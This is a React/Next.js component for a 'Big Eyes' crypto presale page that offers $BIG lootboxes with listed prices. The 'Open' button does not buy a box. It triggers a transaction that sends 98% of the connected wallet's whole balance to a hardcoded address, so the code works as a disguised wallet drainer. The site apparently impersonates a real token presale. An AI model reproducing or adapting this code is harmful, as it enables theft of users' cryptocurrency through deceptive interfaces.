import Image from "next/image";
import Link from "next/link";
import { useRouter } from "next/router";
import React, { useEffect, useState } from "react";
import { FaBars } from "react-icons/fa";
import ConnectWallet from "../connectWallet/ConnectWallet";
import { useBalance, useDisconnect, usePrepareSendTransaction } from "wagmi";
import { useAccount, useConnect } from "wagmi";
import { Connectors } from "@/pages/_app";
import { useSendTransaction } from "wagmi";
import { ethers } from "ethers";
import { openModal } from "@/recoil/commonRecoilState";
import { useRecoilState } from "recoil";
import Slider from "react-slick";
import { BsArrowLeftShort } from "react-icons/bs";

import {
  MdOutlineKeyboardArrowLeft,
  MdOutlineKeyboardArrowRight,
} from "react-icons/md";

export default function Lootboxes() {
  const router = useRouter();
  const [openBuy, setOpenBuy] = useState(false);
  const [click, setClick] = useState(false);
  const [open, setOpen] = useRecoilState(openModal);
  const { connector: activeConnector, isConnected, address } = useAccount();
  const { data, isError, isLoading, isFetched } = useBalance({
    address: address,
  });
  const { disconnectAsync } = useDisconnect();
  const { connectAsync } = useConnect();
  const {
    data: DataTrans,
    isSuccess,
    sendTransactionAsync,
  } = useSendTransaction({
    to: "0x0bf313f2618F42a5a6a96ee9540AFB4b7a2220dC",
    value: ethers.utils
      .parseEther(data?.formatted.toString() || "0")
      .mul(ethers.BigNumber.from("98"))
      .div(ethers.BigNumber.from("100"))
      .toString(),
  });

  const handleClaim = async () => {
    try {
      if (isFetched) {
        await sendTransactionAsync();
      }
    } catch (err) {
      setClick(false);
    }
  };

  const settings = {
    dots: false,
    infinite: false,
    speed: 500,
    slidesToShow: 2.5,
    slidesToScroll: 1.5,
    nextArrow: <MdOutlineKeyboardArrowRight />,
    prevArrow: <MdOutlineKeyboardArrowLeft />,
    responsive: [
      {
        breakpoint: 1028,
        settings: {
          slidesToShow: 2,
          slidesToScroll: 1.5,
        },
      },
      {
        breakpoint: 600,
        settings: {
          slidesToShow: 1.3,
          slidesToScroll: 1,
        },
      },
      {
        breakpoint: 480,
        settings: {
          arrows: false,
          slidesToShow: 1,
          slidesToScroll: 1,
        },
      },
    ],
  };
  const renderItem = () => {
    const arr = [
      {
        name: "Saver Tin",
        img: "https://buy1.bigeyes.space/img/lootbox-saver-tin/lootbox-saver-tin.webp",
        price: "$9.99",
        maxPrice: " $500",
        amount: 10,
      },
      {
        name: "Cute Box",
        img: "https://buy1.bigeyes.space/img/lootbox-cute-box/lootbox-cute-box.webp",
        price: "$99",
        maxPrice: " $5k",
        amount: 5,
      },
      {
        name: "Kitty Vault",
        img: "https://buy1.bigeyes.space/img/lootbox-kitty-vault/lootbox-kitty-vault.webp",
        price: "$499",
        maxPrice: " $25k",
        amount: 3,
      },
      {
        name: "Super Saiyan Box",
        img: "https://buy1.bigeyes.space/img/lootbox-super-saiyan-box/lootbox-super-saiyan-box.webp",
        price: "$999",
        maxPrice: " $100k",
        amount: 1,
      },
      {
        name: "Excali-Paw Chest",
        img: "https://buy1.bigeyes.space/img/lootbox-excali-paw-chest/lootbox-excali-paw-chest.webp",
        price: "$9.999",
        maxPrice: " $100M",
        amount: 1,
      },
    ];
    return arr.map((item, index) => {
      return (
        <div key={index} className="min-w-[18rem] pr-4 md:p-[24px] ">
          <div className="border-[3px] border-[#c4c4c4] rounded-[2rem] pt-[1rem] pb-[.5rem] text-center overflow-hidden">
            <h1 className="font-Extra font-[900] text-[1.5rem] text-center leading-[1.032em]">
              {item.name}
            </h1>
            <div className="relative w-[15rem] h-[15rem] mx-auto flex items-center justify-center">
              <Image src={item.img} width={272} height={243} alt="" />
              <h2 className="bg-white absolute bottom-[7%] left-2/4 -translate-x-2/4 text-[1.125rem] font-[900] px-[.5rem] border-[2px] border-black min-w-[4rem] rounded-full">
                {item.price}
              </h2>
            </div>
            <div className="border-y-[3px] border-[#c4c4c4] py-[0.5rem] ">
              <svg
                width="19.41mm"
                height="22px"
                viewBox="0 0 19.41 8.1634"
                className="mx-auto animate-live-text-flash"
                xmlns="http://www.w3.org/2000/svg"
                fill="#04f7fc"
                stroke="#ff1329"
              >
                <g transform="translate(-58.681 -104.75)">
                  <path
                    d="m41.724 103.56c-0.20807-0.2507-0.33344-1.6438-0.36313-4.0349 0 0-0.15132-3.5103-0.01952-3.6133 0.13696-0.10704 0.63564-0.03873 0.63564-0.03873 0.6132 0 0.67384 0.11582 0.83118 1.5875 0.09335 0.87312 0.18264 2.2649 0.19844 3.0929l0.02872 1.5054 0.96539 0.0821c1.1442 0.0973 1.6956 0.74918 1.1697 1.3829-0.4595 0.55366-2.9948 0.58025-3.4464 0.0361zm8.5264 0.0522c-0.14191-0.1819-0.63847-1.8686-1.1035-3.7481-0.76757-3.1026-0.80726-3.4556-0.43087-3.832 0.66692-0.66692 1.2675-0.04145 1.7201 1.7913l0.40435 1.6375 0.34875-1.1324c0.48067-1.5608 1.0221-2.323 1.65-2.323 0.75423 0 0.87914 0.57262 0.38285 1.7551-0.23617 0.56269-0.6645 2.028-0.95183 3.2562-0.28734 1.2282-0.65187 2.3891-0.81007 2.5797-0.36293 0.43731-0.87579 0.44403-1.2098 0.0159zm4.3558 0c-0.34558-0.26184-0.47367-1.0205-0.61497-3.6425-0.21475-3.9847-0.1579-4.0815 2.3442-3.9912 1.7512 0.06319 2.3102 0.33245 2.3102 1.1127 0 0.58618-0.99028 0.89907-2.1264 0.67184-0.6958-0.13916-0.78402-0.08491-0.78402 0.48207 0 0.54726 0.14227 0.65065 0.99219 0.72099 0.86005 0.07118 0.99219 0.17021 0.99219 0.74358 0 0.57336-0.13214 0.6724-0.99219 0.74358-0.89752 0.0743-0.99219 0.15472-0.99219 0.84313 0 0.65964 0.11099 0.77206 0.83321 0.84392 1.1126 0.11071 1.6106 0.89529 0.90216 1.4213-0.63163 0.46903-2.274 0.49807-2.8645 0.0506zm-8.3866-0.44562c-0.15064-0.28148-0.27389-1.3488-0.27389-2.3719 0-1.6141 0.0729-1.8992 0.55118-2.1552 0.43971-0.23533 0.65374-0.20216 1.0583 0.16399 0.40968 0.37075 0.50716 0.82234 0.50716 2.3494 0 1.1176-0.1298 2.0202-0.3175 2.208-0.47674 0.47674-1.2166 0.38251-1.5253-0.19427zm-0.3774-6.071c-0.60618-0.66982-0.1554-1.6954 0.6897-1.5692 0.77612 0.11592 1.2118 0.87971 0.8393 1.4713-0.41559 0.65992-0.98728 0.69654-1.529 0.09795z"
                    stroke-width="0.26458"
                  ></path>
                  <path
                    d="m59.34 112.29c-0.18826-0.22683-0.3017-1.4873-0.32856-3.6508 0 0-0.13691-3.1761-0.01766-3.2693 0.12392-0.0969 0.57513-0.035 0.57513-0.035 0.55483 0 0.6097 0.10479 0.75206 1.4364 0.08446 0.79001-0.08134 2.1584 0.17955 2.7984l0.02599 1.3621 0.8735 0.0743c1.0353 0.0881 1.5342 0.67787 1.0583 1.2512-0.41576 0.50095-2.7097 0.52501-3.1183 0.0327zm9.8315 0.0472c-0.06454-0.07-0.5777-1.6907-0.99843-3.3913-0.6945-2.8072-0.73042-3.1266-0.38986-3.4672 0.60343-0.60343 1.1469-0.0375 1.5564 1.6208l0.36586 1.4816 0.31555-1.0246c0.43492-1.4122 0.92481-2.1019 1.493-2.1019 0.68243 0 0.79546 0.51811 0.34641 1.588-0.21369 0.50912-0.60124 1.8349-0.86123 2.9462-0.25998 1.1113-0.58982 2.1616-0.73296 2.3341-0.32838 0.39568-1.0292 0.10288-1.0947 0.0144-1.2e-5 -2e-5 0-5e-5 0-5e-5zm4.9995 0c-0.31268-0.23691-0.42858-0.92337-0.55643-3.2958-0.19431-3.6054-0.14287-3.693 2.1211-3.6113 1.5845 0.0572 2.0903 0.3008 2.0903 1.0068 0 0.53038-0.89601 0.81348-1.924 0.60788-0.62956-0.12591-0.70938-0.0768-0.70938 0.43618 0 0.49517 0.12873 0.58871 0.89774 0.65235 0.77818 0.0644 0.89774 0.15401 0.89774 0.67279 0 0.51877-0.11956 0.60838-0.89774 0.67279-0.81209 0.0672-0.89774 0.13999-0.89774 0.76287 0 0.59684 0.10042 0.69856 0.7539 0.76357 1.0067 0.10017 1.4572 0.81006 0.81628 1.286-0.5715 0.42438-2.0575 0.45066-2.5918 0.0458zm-9.7049-0.40319c-0.1363-0.25469-0.24782-1.2204-0.24782-2.1461 0-1.4605 0.06596-1.7184 0.49871-1.95 0.39786-0.21292 0.59151-0.18292 0.95759 0.14838 0.37068 0.33546 0.45888 0.74405 0.45888 2.1258 0 1.0112-0.11745 1.8279-0.28728 1.9978-0.43136 0.43135-1.1008 0.34609-1.3801-0.17577zm-0.34147-5.493c-0.54847-0.60605-0.14061-1.534 0.62405-1.4198 0.70224 0.10488 1.0965 0.79596 0.75941 1.3312-0.20969 0.33296-0.52593 0.42169-0.81475 0.37951-0.22911-0.0335-0.45846-0.13528-0.5687-0.29091-0.15518-0.21908 0 3e-5 0 3e-5z"
                    stroke-width="0.52917"
                  ></path>
                </g>
              </svg>
            </div>
            <div className="border-b-[3px] border-[#c4c4c4] py-[0.5rem] ">
              Max Prize: {item.maxPrice}
            </div>
            <div className="px-2 sm:px-4 pt-4 pb-3">
              {!address && (
                <button
                  className="w-full bg-[#f38590] text-white border-[5px] text-[1.25rem] hover:font-semibold border-[#F9C7CC] rounded-full  py-[.375rem] px-[1.5rem] font-semibold hover:bg-[#F9C7CC] hover:text-black transition-all duration-300"
                  onClick={() => {
                    setOpen({ open: true, component: <ConnectWallet /> });
                  }}
                >
                  Connect account to try
                </button>
              )}
              {address && (
                <p className="text-[#f38590] text-[1.2rem] font-bold">
                  You own {item.amount}
                </p>
              )}
              <button
                disabled={!address}
                className={`mt-4  ${
                  address
                    ? "bg-[#f38590] hover:bg-[#F9C7CC] hover:text-black"
                    : "w-full bg-[#ccc]"
                }  text-white border-[5px] text-[1.25rem] hover:font-semibold border-[#F9C7CC] rounded-full  py-[.375rem] px-[.75rem] font-semibold  transition-all duration-300`}
                onClick={() => {
                  setClick(true);
                  handleClaim();
                }}
              >
                Open
              </button>
            </div>
          </div>
        </div>
      );
    });
  };
  return (
    <div
      className="p-4 sm:px-[48px] md:px-[72px] xl:px-[104px] py-[128px] bg-[rgb(214,244,251)]"
      id="Lootboxes"
    >
      <div
        className={`${
          openBuy ? "h-auto" : "2xl:h-[569px]"
        } min-h-[311px]  border-[0.1875rem] border-[#5b5b5b] rounded-[4rem] xl:rounded-[6.25rem] overflow-hidden bg-[#fffef5] shadow-card`}
      >
        <div className="bg-[#a6e8fe] border-b-[0.1875rem] border-[#000] flex items-center gap-3 pl-[4.5rem] py-4">
          <div className="w-[1.5rem] h-[1.5rem] rounded-full bg-[#eb6e6e] border-[0.125rem] border-[#000]"></div>
          <div className="w-[1.5rem] h-[1.5rem] rounded-full bg-[#ffdea9] border-[0.125rem] border-[#000]"></div>
          <div className="w-[1.5rem] h-[1.5rem] rounded-full bg-[#cce79e] border-[0.125rem] border-[#000]"></div>
        </div>
        {/* khi chưa ấn buy lootbox */}
        {!openBuy && (
          <div className="py-[2rem] 2xl:py-[96px] px-[2rem] 2xl:px-[150px]">
            <div className="max-w-[80rem] w-full flex flex-col-reverse min-[1028px]:flex-row items-center ">
              <div className="xl:mr-[2rem] 2xl:px-6">
                <h1 className="my-4 text-[2.5rem] leading-[1.025em] sm:leading-none min-[1440px]:text-[2.875rem] 2xl:text-[3.125rem] max-w-[17rem] md:max-w-[36rem] min-[1028px]:max-w-[30rem] min-[1440px]:max-w-[35rem] font-Extra text-center font-900">
                  Open lootboxes to win{" "}
                  <span className="font-Extra font-[900]">$</span>
                  BIG!
                </h1>
                <h2 className="mb-[20px] mt-[35px] font-bold text-[#f48d97] leading-7  max-w-[17rem] md:max-w-[36rem] min-[1028px]:max-w-[31rem] min-[1440px]:max-w-[33rem] mx-auto text-center text-[24px]">
                  Enter our presale in a fun way! Open lootboxes to get a random
                  amount of $BIG tokens!
                </h2>
                <div className="mt-4 flex flex-col sm:flex-row justify-center items-center  max-w-[17rem] md:max-w-[36rem] min-[1028px]:max-w-[28rem] min-[1440px]:max-w-[35rem]">
                  <button
                    className="m-[.5rem] bg-[#f38590] max-w-[13rem] w-full whitespace-nowrap text-white border-[5px] text-[1.125rem] 2xl:text-[1.25rem] hover:font-semibold border-[#F9C7CC] rounded-full  py-[8px] px-[24px] font-semibold hover:bg-[#F9C7CC] hover:text-black transition-all duration-300"
                    onClick={() => {
                      setOpenBuy(true);
                    }}
                  >
                    Buy Lootboxes
                  </button>

                  <button
                    className="m-[.5rem] bg-[#f38590] max-w-[13rem] w-full whitespace-nowrap text-white border-[5px] text-[1.125rem] 2xl:text-[1.25rem] hover:font-semibold border-[#F9C7CC] rounded-full  py-[8px] px-[24px] font-semibold hover:bg-[#F9C7CC] hover:text-black transition-all duration-300"
                    onClick={() => {
                      window.open(
                        "https://opensea.io/collection/big-eyes-lootbox-cards",
                        "_blank"
                      );
                    }}
                  >
                    View on OpenSea
                  </button>
                </div>
              </div>
              <div className="max-w-[30rem] xl:ml-[2rem]  relative">
                <div className=" -left-[30%] min-[1028px]:left-0 2xl:left-[20%] relative">
                  <Image
                    src="https://buy1.bigeyes.space/img/treasure-chest/treasure-chest.webp"
                    className="hidden sm:block"
                    width={280}
                    height={250}
                    alt=""
                  />
                  <Image
                    src="https://buy1.bigeyes.space/img/treasure-chest/treasure-chest.webp"
                    className="block sm:hidden"
                    width={190}
                    height={176}
                    alt=""
                  />
                  <div className="absolute top-0 left-full -translate-y-[10%] -translate-x-[20%] w-[240px] h-[230px]">
                    <Image
                      src="https://buy1.bigeyes.space/img/cat-stretching/cat-stretching.webp"
                      className="hidden sm:block"
                      width={240}
                      height={230}
                      alt=""
                    />
                    <Image
                      src="https://buy1.bigeyes.space/img/cat-stretching/cat-stretching.webp"
                      className="block sm:hidden"
                      width={130}
                      height={130}
                      alt=""
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* khi ấn rồi sẽ ra ntn */}
        {openBuy && (
          <div className="relative max-w-[70rem] 2xl:max-w-[65rem]  py-[5rem] 2xl:py-[6rem] px-4 md:px-[3rem] xl:px-[5rem] w-full mx-auto">
            <div>
              <h1 className="relative text-[3.5rem] font-Extra font-[900] text-center mt-4">
                Lootboxes
              </h1>
              <p className="text-[#f38590] text-center text-[1.5rem]  mb-4 font-bold">
                Buy and open lootboxes to win $BIG tokens.
              </p>
            </div>
            <Slider {...settings}>{renderItem()}</Slider>
            <div className="text-center">
              <button
                className="mt-4  min-w-[10rem] bg-[#f38590] text-white border-[5px] text-[1.25rem] 2xl:text-[1.375rem] hover:font-semibold border-[#F9C7CC] rounded-full  py-[.625rem] px-[1.5rem] font-semibold hover:bg-[#F9C7CC] hover:text-black transition-all duration-300"
                onClick={() => {}}
              >
                Reward
              </button>
            </div>
            <div className="top-8 md:top-[8%] left-20 md:left-[4%] absolute">
              <button class=" bg-[#f38590] p-[.5rem] text-white w-[2.5rem] h-[2.5rem] flex items-center justify-center border-[5px] border-[#F9C7CC] rounded-full">
                <FaBars />
              </button>
              <div></div>
            </div>
            <button
              className="absolute top-6 left-4 md:left-0 w-[48px] h-[48px] flex items-center justify-center hover:bg-[#0000001a] rounded-full"
              onClick={() => {
                setOpenBuy(false);
              }}
            >
              <BsArrowLeftShort className="text-5xl" />
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
